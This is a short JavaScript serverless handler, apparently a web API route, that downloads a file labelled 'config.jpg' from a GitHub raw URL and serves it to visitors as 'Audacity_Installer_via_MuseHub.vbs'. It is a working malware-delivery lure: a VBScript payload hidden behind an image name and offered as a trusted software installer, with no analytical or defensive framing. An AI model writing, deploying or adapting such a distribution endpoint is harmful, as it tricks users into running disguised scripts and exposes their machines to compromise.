export default async function handler(req, res) {
  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/config.jpg';

  try {
    const response = await fetch(rawUrl);

    if (!response.ok) {
      return res.status(500).send('error!');
    }

    const buffer = Buffer.from(await response.arrayBuffer());

    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="Audacity_Installer_via_MuseHub.vbs"');
    res.setHeader('Content-Length', buffer.length);

    res.send(buffer);
  } catch (error) {
    res.status(500).send('error: ' + error.message);
  }
}
